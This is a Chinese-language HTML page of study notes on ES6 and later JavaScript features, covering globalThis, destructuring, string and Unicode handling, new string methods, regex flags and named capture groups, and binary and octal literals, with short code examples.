<h2 id="globalThis-对象"><a href="#globalThis-对象" class="headerlink" title="globalThis 对象"></a>globalThis 对象</h2><p>JavaScript 语言存在一个顶层对象，它提供全局环境（即全局作用域），所有代码都是在这个环境中运行。但是，顶层对象在各种实现里面是不统一的。</p>
<ol>
<li>浏览器里面，顶层对象是window，但 Node 和 Web Worker 没有window。</li>
<li>浏览器和 Web Worker 里面，self也指向顶层对象，但是 Node 没有self。</li>
<li>Node 里面，顶层对象是global，但其他环境都不支持。</li>
</ol>
<p>ES2020 在语言标准的层面，引入globalThis作为顶层对象。也就是说，任何环境下，globalThis都是存在的，都可以从它拿到顶层对象，指向全局环境下的this。</p>
<p>垫片库global-this模拟了这个提案，可以在所有环境拿到globalThis。</p>
<h1 id="变量的解构赋值"><a href="#变量的解构赋值" class="headerlink" title="变量的解构赋值"></a>变量的解构赋值</h1><h1 id="数组的解构赋值"><a href="#数组的解构赋值" class="headerlink" title="数组的解构赋值"></a>数组的解构赋值</h1><h2 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h2><p>ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）。</p>
<p>如果等号的右边不是数组（或者严格地说，不是可遍历的结构，参见《Iterator》一章），那么将会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [foo] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">NaN</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = &#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>对于 Set 结构，也可以使用数组的解构赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [x, y, z] = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>]);</span><br><span class="line">x <span class="comment">// "a"</span></span><br></pre></td></tr></table></figure>
<h2 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h2><p>注意，ES6 内部使用严格相等运算符（===），判断一个位置是否有值。所以，只有当一个数组成员严格等于undefined，默认值才会生效。</p>
<h1 id="对象的解构赋值"><a href="#对象的解构赋值" class="headerlink" title="对象的解构赋值"></a>对象的解构赋值</h1><p>对象的解构赋值可以取到继承的属性<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> obj2 = &#123; <span class="attr">foo</span>: <span class="string">'bar'</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj1, obj2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; foo &#125; = obj1;</span><br><span class="line">foo <span class="comment">// "bar"</span></span><br></pre></td></tr></table></figure></p>
<p>默认值生效的条件是，对象的属性值严格等于undefined。</p>
<p>由于数组本质是特殊的对象，因此可以对数组进行对象属性的解构。</p>
<p>字符串也可以解构赋值。这是因为此时，字符串被转换成了一个类似数组的对象。</p>
<h2 id="圆括号问题"><a href="#圆括号问题" class="headerlink" title="圆括号问题"></a>圆括号问题</h2><p>如果模式中出现圆括号怎么处理。ES6 的规则是，只要有可能导致解构的歧义，就不得使用圆括号。</p>
<p>但是，这条规则实际上不那么容易辨别，处理起来相当麻烦。因此，建议只要有可能，就不要在模式中放置圆括号。</p>
<p>可以使用圆括号的情况只有一种：赋值语句的非模式部分，可以使用圆括号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[(b)] = [<span class="number">3</span>]; <span class="comment">// 正确</span></span><br><span class="line">(&#123; <span class="attr">p</span>: (d) &#125; = &#123;&#125;); <span class="comment">// 正确</span></span><br><span class="line">[(<span class="built_in">parseInt</span>.prop)] = [<span class="number">3</span>]; <span class="comment">// 正确</span></span><br></pre></td></tr></table></figure>
<h1 id="字符串的扩展"><a href="#字符串的扩展" class="headerlink" title="字符串的扩展"></a>字符串的扩展</h1><h2 id="字符的-Unicode-表示法"><a href="#字符的-Unicode-表示法" class="headerlink" title="字符的 Unicode 表示法"></a>字符的 Unicode 表示法</h2><p>ES6 加强了对 Unicode 的支持，允许采用\uxxxx形式表示一个字符，其中xxxx表示字符的 Unicode 码点。</p>
<p>但是，这种表示法只限于码点在\u0000~\uFFFF之间的字符。超出这个范围的字符，必须用两个双字节的形式表示。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">"\uD842\uDFB7"</span></span><br><span class="line"><span class="comment">// "𠮷"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"\u20BB7"</span></span><br><span class="line"><span class="comment">// "₻7"</span></span><br></pre></td></tr></table></figure>
<p>ES6 对这一点做出了改进，只要将码点放入大括号，就能正确解读该字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">"\u&#123;20BB7&#125;"</span></span><br><span class="line"><span class="comment">// "𠮷"</span></span><br></pre></td></tr></table></figure>
<p>有了这种表示法之后，JavaScript 共有 6 种方法可以表示一个字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'\z'</span> === <span class="string">'z'</span>  <span class="comment">// true</span></span><br><span class="line"><span class="string">'\172'</span> === <span class="string">'z'</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">'\x7A'</span> === <span class="string">'z'</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">'\u007A'</span> === <span class="string">'z'</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">'\u&#123;7A&#125;'</span> === <span class="string">'z'</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h2 id="字符串的遍历器接口"><a href="#字符串的遍历器接口" class="headerlink" title="字符串的遍历器接口"></a>字符串的遍历器接口</h2><p>ES6 为字符串添加了遍历器接口（详见《Iterator》一章），使得字符串可以被for…of循环遍历。</p>
<p>除了遍历字符串，这个遍历器最大的优点是可以识别大于0xFFFF的码点，传统的for循环无法识别这样的码点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> text = <span class="built_in">String</span>.fromCodePoint(<span class="number">0x20BB7</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; text.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(text[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// " "</span></span><br><span class="line"><span class="comment">// " "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> text) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// "𠮷"</span></span><br></pre></td></tr></table></figure>
<h2 id="直接输入-U-2028-和-U-2029"><a href="#直接输入-U-2028-和-U-2029" class="headerlink" title="直接输入 U+2028 和 U+2029"></a>直接输入 U+2028 和 U+2029</h2><p>JavaScript 字符串允许直接输入字符，以及输入字符的转义形式。举例来说，“中”的 Unicode 码点是 U+4e2d，你可以直接在字符串里面输入这个汉字，也可以输入它的转义形式\u4e2d，两者是等价的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'中'</span> === <span class="string">'\u4e2d'</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>但是，JavaScript 规定有5个字符，不能在字符串里面直接使用，只能使用转义形式。</p>
<p>U+005C：反斜杠（reverse solidus)<br>U+000D：回车（carriage return）<br>U+2028：行分隔符（line separator）<br>U+2029：段分隔符（paragraph separator）<br>U+000A：换行符（line feed）</p>
<p>为了消除JSON 格式允许字符串里面直接使用 U+2028（行分隔符）和 U+2029（段分隔符）报错，ES2019 允许 JavaScript 字符串直接输入 U+2028（行分隔符）和 U+2029（段分隔符）。</p>
<h2 id="标签模板"><a href="#标签模板" class="headerlink" title="标签模板"></a>标签模板</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">s, v1, v2</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s) <span class="comment">// ["Hello ", " world ", "", raw: Array(3)]</span></span><br><span class="line">  <span class="built_in">console</span>.log(v1);<span class="comment">// 15</span></span><br><span class="line">  <span class="built_in">console</span>.log(v2);<span class="comment">// 50</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tag<span class="string">`Hello <span class="subst">$&#123; a + b &#125;</span> world <span class="subst">$&#123; a * b&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>
<p>模板处理函数的第一个参数（模板字符串数组），还有一个raw属性，保存的是转义后的原字符串。</p>
<p>ES2018 放松了对标签模板里面的字符串转义的限制。如果遇到不合法的字符串转义，就返回undefined，而不是报错，并且从raw属性上面可以得到原始字符串。</p>
<h1 id="字符串的新增方法"><a href="#字符串的新增方法" class="headerlink" title="字符串的新增方法"></a>字符串的新增方法</h1><h2 id="String-fromCodePoint"><a href="#String-fromCodePoint" class="headerlink" title="String.fromCodePoint()"></a>String.fromCodePoint()</h2><p>ES5 提供String.fromCharCode()方法，用于从 Unicode 码点返回对应字符，但是这个方法不能识别码点大于0xFFFF的字符。</p>
<p>ES6 提供了String.fromCodePoint()方法，可以识别大于0xFFFF的字符，弥补了String.fromCharCode()方法的不足。在作用上，正好与下面的codePointAt()方法相反。</p>
<h2 id="String-raw"><a href="#String-raw" class="headerlink" title="String.raw()"></a>String.raw()</h2><p>ES6 还为原生的 String 对象，提供了一个raw()方法。该方法返回一个斜杠都被转义（即斜杠前面再加一个斜杠）的字符串，往往用于模板字符串的处理方法。</p>
<h2 id="实例方法：codePointAt"><a href="#实例方法：codePointAt" class="headerlink" title="实例方法：codePointAt()"></a>实例方法：codePointAt()</h2><p>对于4个字节的字符，JavaScript 不能正确处理，字符串长度会误判为2。charAt()方法无法读取整个字符，charCodeAt()方法只能分别返回前两个字节和后两个字节的值。</p>
<p>ES6 提供了codePointAt()方法，能够正确处理 4 个字节储存的字符，返回一个字符的码点。</p>
<p>使用for…of循环，因为它会正确识别 32 位的 UTF-16 字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">'𠮷a'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> ch <span class="keyword">of</span> s) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(ch.codePointAt(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="实例方法：normalize"><a href="#实例方法：normalize" class="headerlink" title="实例方法：normalize()"></a>实例方法：normalize()</h2><p>许多欧洲语言有语调符号和重音符号。为了表示它们，Unicode 提供了两种方法。一种是直接提供带重音符号的字符，比如Ǒ（\u01D1）。另一种是提供合成符号（combining character），即原字符与重音符号的合成，两个字符合成一个字符，比如O（\u004F）和ˇ（\u030C）合成Ǒ（\u004F\u030C）。</p>
<p>这两种表示方法，在视觉和语义上都等价，但是 JavaScript 不能识别。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'\u01D1'</span>===<span class="string">'\u004F\u030C'</span> <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="string">'\u01D1'</span>.length <span class="comment">// 1</span></span><br><span class="line"><span class="string">'\u004F\u030C'</span>.length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>ES6 提供字符串实例的normalize()方法，用来将字符的不同表示方法统一为同样的形式，这称为 Unicode 正规化。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'\u01D1'</span>.normalize() === <span class="string">'\u004F\u030C'</span>.normalize()</span><br></pre></td></tr></table></figure>
<h2 id="实例方法：includes-startsWith-endsWith"><a href="#实例方法：includes-startsWith-endsWith" class="headerlink" title="实例方法：includes(), startsWith(), endsWith()"></a>实例方法：includes(), startsWith(), endsWith()</h2><p>传统上，JavaScript 只有indexOf方法，可以用来确定一个字符串是否包含在另一个字符串中。ES6 又提供了三种新方法。</p>
<ol>
<li>includes()：返回布尔值，表示是否找到了参数字符串。</li>
<li>startsWith()：返回布尔值，表示参数字符串是否在原字符串的头部。</li>
<li>endsWith()：返回布尔值，表示参数字符串是否在原字符串的尾部。</li>
</ol>
<h2 id="实例方法：repeat"><a href="#实例方法：repeat" class="headerlink" title="实例方法：repeat()"></a>实例方法：repeat()</h2><p>repeat方法返回一个新字符串，表示将原字符串重复n次。</p>
<h2 id="实例方法：padStart-，padEnd"><a href="#实例方法：padStart-，padEnd" class="headerlink" title="实例方法：padStart()，padEnd()"></a>实例方法：padStart()，padEnd()</h2><p>ES2017 引入了字符串补全长度的功能。如果某个字符串不够指定长度，会在头部或尾部补全。padStart()用于头部补全，padEnd()用于尾部补全。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'x'</span>.padStart(<span class="number">5</span>, <span class="string">'ab'</span>) <span class="comment">// 'ababx'</span></span><br><span class="line"><span class="string">'x'</span>.padStart(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'abax'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'x'</span>.padEnd(<span class="number">5</span>, <span class="string">'ab'</span>) <span class="comment">// 'xabab'</span></span><br><span class="line"><span class="string">'x'</span>.padEnd(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'xaba'</span></span><br></pre></td></tr></table></figure>
<p>padStart()的常见用途是为数值补全指定位数。下面代码生成 10 位的数值字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'1'</span>.padStart(<span class="number">10</span>, <span class="string">'0'</span>) <span class="comment">// "0000000001"</span></span><br><span class="line"><span class="string">'12'</span>.padStart(<span class="number">10</span>, <span class="string">'0'</span>) <span class="comment">// "0000000012"</span></span><br><span class="line"><span class="string">'123456'</span>.padStart(<span class="number">10</span>, <span class="string">'0'</span>) <span class="comment">// "0000123456"</span></span><br></pre></td></tr></table></figure>
<p>另一个用途是提示字符串格式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'12'</span>.padStart(<span class="number">10</span>, <span class="string">'YYYY-MM-DD'</span>) <span class="comment">// "YYYY-MM-12"</span></span><br><span class="line"><span class="string">'09-12'</span>.padStart(<span class="number">10</span>, <span class="string">'YYYY-MM-DD'</span>) <span class="comment">// "YYYY-09-12"</span></span><br></pre></td></tr></table></figure>
<h2 id="实例方法：trimStart-，trimEnd"><a href="#实例方法：trimStart-，trimEnd" class="headerlink" title="实例方法：trimStart()，trimEnd()"></a>实例方法：trimStart()，trimEnd()</h2><p>ES2019 对字符串实例新增了trimStart()和trimEnd()这两个方法。它们的行为与trim()一致，trimStart()消除字符串头部的空格，trimEnd()消除尾部的空格。它们返回的都是新字符串，不会修改原始字符串。</p>
<h2 id="实例方法：matchAll"><a href="#实例方法：matchAll" class="headerlink" title="实例方法：matchAll()"></a>实例方法：matchAll()</h2><p>matchAll()方法返回一个正则表达式在当前字符串的所有匹配，详见《正则的扩展》的一章。</p>
<h1 id="正则的扩展"><a href="#正则的扩展" class="headerlink" title="正则的扩展"></a>正则的扩展</h1><p>字符串对象共有 4 个方法，可以使用正则表达式：match()、replace()、search()和split()。</p>
<p>ES6 将这 4 个方法，在语言内部全部调用RegExp的实例方法，从而做到所有与正则相关的方法，全都定义在RegExp对象上。</p>
<p>String.prototype.match 调用 RegExp.prototype[Symbol.match]<br>String.prototype.replace 调用 RegExp.prototype[Symbol.replace]<br>String.prototype.search 调用 RegExp.prototype[Symbol.search]<br>String.prototype.split 调用 RegExp.prototype[Symbol.split]</p>
<h2 id="u修饰符"><a href="#u修饰符" class="headerlink" title="u修饰符"></a>u修饰符</h2><p>ES6 对正则表达式添加了u修饰符，含义为“Unicode 模式”，用来正确处理大于\uFFFF的 Unicode 字符。也就是说，会正确处理四个字节的 UTF-16 编码。</p>
<h2 id="RegExp-prototype-unicode-属性"><a href="#RegExp-prototype-unicode-属性" class="headerlink" title="RegExp.prototype.unicode 属性"></a>RegExp.prototype.unicode 属性</h2><p>正则实例对象新增unicode属性，表示是否设置了u修饰符。</p>
<h2 id="y-修饰符"><a href="#y-修饰符" class="headerlink" title="y 修饰符"></a>y 修饰符</h2><p>除了u修饰符，ES6 还为正则表达式添加了y修饰符，叫做“粘连”（sticky）修饰符。</p>
<p>y修饰符的作用与g修饰符类似，也是全局匹配，后一次匹配都从上一次匹配成功的下一个位置开始。不同之处在于，g修饰符只要剩余位置中存在匹配就可，而y修饰符确保匹配必须从剩余的第一个位置开始，这也就是“粘连”的涵义。</p>
<h2 id="RegExp-prototype-sticky-属性"><a href="#RegExp-prototype-sticky-属性" class="headerlink" title="RegExp.prototype.sticky 属性"></a>RegExp.prototype.sticky 属性</h2><p>与y修饰符相匹配，ES6 的正则实例对象多了sticky属性，表示是否设置了y修饰符。</p>
<h2 id="RegExp-prototype-flags-属性"><a href="#RegExp-prototype-flags-属性" class="headerlink" title="RegExp.prototype.flags 属性"></a>RegExp.prototype.flags 属性</h2><p>ES6 为正则表达式新增了flags属性，会返回正则表达式的修饰符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 的 source 属性</span></span><br><span class="line"><span class="comment">// 返回正则表达式的正文</span></span><br><span class="line">/abc/ig.source</span><br><span class="line"><span class="comment">// "abc"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 的 flags 属性</span></span><br><span class="line"><span class="comment">// 返回正则表达式的修饰符</span></span><br><span class="line">/abc/ig.flags</span><br><span class="line"><span class="comment">// 'gi'</span></span><br></pre></td></tr></table></figure>
<h2 id="s-修饰符：dotAll-模式"><a href="#s-修饰符：dotAll-模式" class="headerlink" title="s 修饰符：dotAll 模式"></a>s 修饰符：dotAll 模式</h2><p>正则表达式中，点（.）是一个特殊字符，代表任意的单个字符，但是有两个例外。一个是四个字节的 UTF-16 字符，这个可以用u修饰符解决；另一个是行终止符（line terminator character）。</p>
<p>所谓行终止符，就是该字符表示一行的终结。以下四个字符属于“行终止符”。</p>
<p>U+000A 换行符（\n）<br>U+000D 回车符（\r）<br>U+2028 行分隔符（line separator）<br>U+2029 段分隔符（paragraph separator）</p>
<p>ES2018 引入s修饰符，使得.可以匹配任意单个字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/foo.bar/s.test(<span class="string">'foo\nbar'</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>这被称为dotAll模式，即点（dot）代表一切字符。所以，正则表达式还引入了一个dotAll属性，返回一个布尔值，表示该正则表达式是否处在dotAll模式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">re.dotAll <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>/s修饰符和多行修饰符/m不冲突，两者一起使用的情况下，.匹配所有字符，而^和$匹配每一行的行首和行尾。</p>
<h2 id="后行断言"><a href="#后行断言" class="headerlink" title="后行断言"></a>后行断言</h2><p>JavaScript 语言的正则表达式，只支持先行断言（lookahead）和先行否定断言（negative lookahead），不支持后行断言（lookbehind）和后行否定断言（negative lookbehind）。ES2018 引入后行断言。</p>
<p>“先行断言”指的是，x只有在y前面才匹配，必须写成/x(?=y)/。比如，只匹配百分号之前的数字，要写成/\d+(?=%)/。“先行否定断言”指的是，x只有不在y前面才匹配，必须写成/x(?!y)/。比如，只匹配不在百分号之前的数字，要写成/\d+(?!%)/。</p>
<p>“后行断言”正好与“先行断言”相反，x只有在y后面才匹配，必须写成/(?&lt;=y)x/。比如，只匹配美元符号之后的数字，要写成/(?&lt;=\$)\d+/。“后行否定断言”则与“先行否定断言”相反，x只有不在y后面才匹配，必须写成/(?&lt;!y)x/。比如，只匹配不在美元符号后面的数字，要写成/(?&lt;!\$)\d+/。</p>
<h2 id="Unicode-属性类"><a href="#Unicode-属性类" class="headerlink" title="Unicode 属性类"></a>Unicode 属性类</h2><p>ES2018 引入了一种新的类的写法\p{…}和\P{…}，允许正则表达式匹配符合 Unicode 某种属性的所有字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> regexGreekSymbol = <span class="regexp">/\p&#123;Script=Greek&#125;/u</span>;</span><br><span class="line">regexGreekSymbol.test(<span class="string">'π'</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h2 id="具名组匹配"><a href="#具名组匹配" class="headerlink" title="具名组匹配"></a>具名组匹配</h2><p>正则表达式使用圆括号进行组匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_DATE = <span class="regexp">/(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，正则表达式里面有三组圆括号。使用exec方法，就可以将这三组匹配结果提取出来。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_DATE = <span class="regexp">/(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> matchObj = RE_DATE.exec(<span class="string">'1999-12-31'</span>);</span><br><span class="line"><span class="keyword">const</span> year = matchObj[<span class="number">1</span>]; <span class="comment">// 1999</span></span><br><span class="line"><span class="keyword">const</span> month = matchObj[<span class="number">2</span>]; <span class="comment">// 12</span></span><br><span class="line"><span class="keyword">const</span> day = matchObj[<span class="number">3</span>]; <span class="comment">// 31</span></span><br></pre></td></tr></table></figure>
<p>ES2018 引入了具名组匹配（Named Capture Groups），允许为每一个组匹配指定一个名字，既便于阅读代码，又便于引用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_DATE = <span class="regexp">/(?&lt;year&gt;\d&#123;4&#125;)-(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)/</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> matchObj = RE_DATE.exec(<span class="string">'1999-12-31'</span>);</span><br><span class="line"><span class="keyword">const</span> year = matchObj.groups.year; <span class="comment">// 1999</span></span><br><span class="line"><span class="keyword">const</span> month = matchObj.groups.month; <span class="comment">// 12</span></span><br><span class="line"><span class="keyword">const</span> day = matchObj.groups.day; <span class="comment">// 31</span></span><br></pre></td></tr></table></figure>
<h2 id="解构赋值和替换"><a href="#解构赋值和替换" class="headerlink" title="解构赋值和替换"></a>解构赋值和替换</h2><p>有了具名组匹配以后，可以使用解构赋值直接从匹配结果上为变量赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">groups</span>: &#123;one, two&#125;&#125; = <span class="regexp">/^(?&lt;one&gt;.*):(?&lt;two&gt;.*)$/u</span>.exec(<span class="string">'foo:bar'</span>);</span><br><span class="line">one  <span class="comment">// foo</span></span><br><span class="line">two  <span class="comment">// bar</span></span><br></pre></td></tr></table></figure>
<p>字符串替换时，使用$&lt;组名&gt;引用具名组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> re = <span class="regexp">/(?&lt;year&gt;\d&#123;4&#125;)-(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)/u</span>;</span><br><span class="line"></span><br><span class="line"><span class="string">'2015-01-02'</span>.replace(re, <span class="string">'$&lt;day&gt;/$&lt;month&gt;/$&lt;year&gt;'</span>)</span><br><span class="line"><span class="comment">// '02/01/2015'</span></span><br></pre></td></tr></table></figure>
<p>replace方法的第二个参数也可以是函数，该函数的参数序列如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'2015-01-02'</span>.replace(re, (</span><br><span class="line">   matched, <span class="comment">// 整个匹配结果 2015-01-02</span></span><br><span class="line">   capture1, <span class="comment">// 第一个组匹配 2015</span></span><br><span class="line">   capture2, <span class="comment">// 第二个组匹配 01</span></span><br><span class="line">   capture3, <span class="comment">// 第三个组匹配 02</span></span><br><span class="line">   position, <span class="comment">// 匹配开始的位置 0</span></span><br><span class="line">   S, <span class="comment">// 原字符串 2015-01-02</span></span><br><span class="line">   groups <span class="comment">// 具名组构成的一个对象 &#123;year, month, day&#125;</span></span><br><span class="line"> ) =&gt; &#123;</span><br><span class="line"> <span class="keyword">let</span> &#123;day, month, year&#125; = groups;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;day&#125;</span>/<span class="subst">$&#123;month&#125;</span>/<span class="subst">$&#123;year&#125;</span>`</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>如果要在正则表达式内部引用某个“具名组匹配”，可以使用\k&lt;组名&gt;的写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_TWICE = <span class="regexp">/^(?&lt;word&gt;[a-z]+)!\k&lt;word&gt;$/</span>;</span><br><span class="line">RE_TWICE.test(<span class="string">'abc!abc'</span>) <span class="comment">// true</span></span><br><span class="line">RE_TWICE.test(<span class="string">'abc!ab'</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h2 id="正则匹配索引"><a href="#正则匹配索引" class="headerlink" title="正则匹配索引"></a>正则匹配索引</h2><p>正则匹配结果的开始位置和结束位置，目前获取并不是很方便。正则实例的exec()方法，返回结果有一个index属性，可以获取整个匹配结果的开始位置，但是如果包含组匹配，每个组匹配的开始位置，很难拿到。</p>
<p>现在有一个第三阶段提案，为exec()方法的返回结果加上indices属性，在这个属性上面可以拿到匹配的开始位置和结束位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> text = <span class="string">'zabbcdef'</span>;</span><br><span class="line"><span class="keyword">const</span> re = <span class="regexp">/ab/</span>;</span><br><span class="line"><span class="keyword">const</span> result = re.exec(text);</span><br><span class="line"></span><br><span class="line">result.index <span class="comment">// 1</span></span><br><span class="line">result.indices <span class="comment">// [ [1, 3] ]</span></span><br></pre></td></tr></table></figure>
<h2 id="String-prototype-matchAll"><a href="#String-prototype-matchAll" class="headerlink" title="String.prototype.matchAll()"></a>String.prototype.matchAll()</h2><p>如果一个正则表达式在字符串里面有多个匹配，现在一般使用g修饰符或y修饰符，在循环里面逐一取出。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/t(e)(st(\d?))/g</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">'test1test2test3'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> matches = [];</span><br><span class="line"><span class="keyword">var</span> match;</span><br><span class="line"><span class="keyword">while</span> (match = regex.exec(string)) &#123;</span><br><span class="line">  matches.push(match);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">matches</span><br><span class="line"><span class="comment">// [</span></span><br><span class="line"><span class="comment">//   ["test1", "e", "st1", "1", index: 0, input: "test1test2test3"],</span></span><br><span class="line"><span class="comment">//   ["test2", "e", "st2", "2", index: 5, input: "test1test2test3"],</span></span><br><span class="line"><span class="comment">//   ["test3", "e", "st3", "3", index: 10, input: "test1test2test3"]</span></span><br><span class="line"><span class="comment">// ]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，while循环取出每一轮的正则匹配，一共三轮。</p>
<p>ES2020 增加了String.prototype.matchAll()方法，可以一次性取出所有匹配。不过，它返回的是一个遍历器（Iterator），而不是数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> string = <span class="string">'test1test2test3'</span>;</span><br><span class="line"><span class="keyword">const</span> regex = <span class="regexp">/t(e)(st(\d?))/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> match <span class="keyword">of</span> string.matchAll(regex)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(match);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ["test1", "e", "st1", "1", index: 0, input: "test1test2test3"]</span></span><br><span class="line"><span class="comment">// ["test2", "e", "st2", "2", index: 5, input: "test1test2test3"]</span></span><br><span class="line"><span class="comment">// ["test3", "e", "st3", "3", index: 10, input: "test1test2test3"]</span></span><br></pre></td></tr></table></figure>
<p>返回遍历器的好处在于，如果匹配结果是一个很大的数组，那么遍历器比较节省资源。</p>
<h1 id="数值的扩展"><a href="#数值的扩展" class="headerlink" title="数值的扩展"></a>数值的扩展</h1><h2 id="二进制和八进制表示法"><a href="#二进制和八进制表示法" class="headerlink" title="二进制和八进制表示法"></a>二进制和八进制表示法</h2><p>ES6 提供了二进制和八进制数值的新的写法，分别用前缀0b（或0B）和0o（或0O）表示。</p>
<p>从 ES5 开始，在严格模式之中，八进制就不再允许使用前缀0表示，ES6 进一步明确，要使用前缀0o表示。</p>
<p>如果要将0b和0o前缀的字符串数值转为十进制，要使用Number方法。</p>
